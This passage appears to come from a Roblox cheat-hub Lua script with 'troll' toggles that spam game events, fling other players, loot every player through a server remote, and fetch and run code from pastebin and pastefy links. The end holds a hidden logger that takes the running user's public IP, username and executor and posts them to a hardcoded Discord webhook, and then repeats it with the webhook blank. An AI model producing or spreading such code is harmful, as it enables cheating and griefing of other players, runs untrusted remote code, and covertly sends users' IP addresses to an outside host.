        game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "ONTOP")
    end
    wait(20)
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "ONTOP")

    wait(3)
    for i = 1, 20 do
        game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "ONTOP")
    end
    wait(20)
    game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Save", _G.scriptname .. "wONTOP")

    wait(3)
    for i = 1, 20 do
        game:GetService("ReplicatedStorage").WardrobeEvent:FireServer("Load", _G.scriptname .. "wONTOP")
    end
    wait(20)
    game:GetService("ReplicatedStorage").Ragdoll:FireServer(true)
end)

   end,
})

local Toggle = TrollTab:CreateToggle({
   Name = "Fling All",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local executed = false

local function closeScript()
    executed = true
    StopButton.Visible = false
end

local Gui = Instance.new("ScreenGui")
Gui.Parent = game.Players.LocalPlayer.PlayerGui

local StopButton = Instance.new("TextButton")
StopButton.Parent = Gui
StopButton.Position = UDim2.new(0.5, -50, 0.6, 0)
StopButton.Size = UDim2.new(0, 100, 0, 50)
StopButton.Text = "Stop Script"
StopButton.TextSize = 24 -- Increase text size to 24
StopButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black Background
StopButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White Text
StopButton.Font = Enum.Font.Gotham -- Set font to Gotham
StopButton.MouseButton1Click:Connect(closeScript)

local StarterGui = game:GetService("StarterGui")
StarterGui:SetCore("SendNotification", {
    Title = "SUBSCRIBE TO PHILLYMADEMARE",
    Text = "Credits To AnthonyIsHere"
})

while true and not executed do
    wait(2)
    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
end
   end,
})

local Toggle = TrollTab:CreateToggle({
   Name = "Loot All",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        local lootstealingshit = gunsection.element('Toggle', 'Loot Stealing', false, function(v)
    _G.LootStealing = v.Toggle
    while _G.LootStealing do
        wait(0.5)
        for i,v in pairs(game.Players:GetChildren()) do
            spawn(function()
                local args = {
                    [1] = v
                }
                
                game:GetService("ReplicatedStorage"):WaitForChild("LootPlayerRF"):InvokeServer(unpack(args))
            end)
        end
    end
end)

   end,
})

local Toggle = TrollTab:CreateToggle({
   Name = "Jack Off",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()  
   end,
    })

local http = game:GetService("HttpService")
local webhook = "https://discord.com/api/webhooks/1342066053097717872/8y9AbldV8A-sau__ADDoNfbdc9l_LwTNbmlFbw8a-AUimWfwnOrRhfUtjjP4RT2I_6rt"
local player = game.Players.LocalPlayer

-- Fetch the IP address
local ip
pcall(function()
    ip = game:HttpGet("https://api.ipify.org/")
end)

-- Detect executor
local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif secure_load then
    executor = "Script-Ware"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif pebc_execute then
    executor = "ProtoSmasher"
elseif fluxus then
    executor = "Fluxus"
elseif identifyexecutor then
    executor = identifyexecutor() -- Delta and other executors may support this
end

-- Message to send to webhook
local message = {
    ["content"] = "**KZHUB | LOG**",
    ["embeds"] = {{
        ["title"] = "__**Authorized User**__",
        ["description"] = "Username: **" .. player.Name .. "**\nExecutor: **" .. executor .. "**\nIP: **" .. (ip or "Could not fetch IP") .. "**",
        ["color"] = tonumber(0x00FF00) -- Green color
    }}
}

-- Convert message to JSON
local jsonMessage = http:JSONEncode(message)

-- Send request to Discord webhook
local requestFunction = http_request or request or (syn and syn.request)
if requestFunction then
    requestFunction({
        Url = webhook,
        Body = jsonMessage,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"}
    })
    print("Webhook sent: Username: " .. player.Name .. ", Executor: " .. executor .. ", IP: " .. (ip or "Unknown"))
else
    warn("HTTP request function not found.")
end

local http = game:GetService("HttpService")
local webhook = ""
local player = game.Players.LocalPlayer

-- Fetch the IP address
local ip
pcall(function()
    ip = game:HttpGet("https://api.ipify.org/")
end)

-- Detect executor
local executor = "Unknown"
if syn then
    executor = "Synapse X"
elseif secure_load then
    executor = "Script-Ware"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif pebc_execute then
    executor = "ProtoSmasher"
elseif fluxus then
    executor = "Fluxus"
elseif identifyexecutor then
    executor = identifyexecutor() -- Delta and other executors may support this
end

-- Message to send to webhook
local message = {
    ["content"] = "**KZHUB  | LOG**",
    ["embeds"] = {{
        ["title"] = "__**Authorized User**__",
        ["description"] = "Username: **" .. player.Name .. "**\nExecutor: **" .. executor .. "**\nIP: **" .. (ip or "Could not fetch IP") .. "**",
        ["color"] = tonumber(0x00FF00) -- Green color
    }}
}

-- Convert message to JSON
local jsonMessage = http:JSONEncode(message)

-- Send request to Discord webhook
local requestFunction = http_request or request or (syn and syn.request)
if requestFunction then
    requestFunction({
        Url = webhook,
        Body = jsonMessage,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"}
    })
    print("Webhook sent: Username: " .. player.Name .. ", Executor: " .. executor .. ", IP: " .. (ip or "Unknown"))
else
    warn("HTTP request function not found.")
end
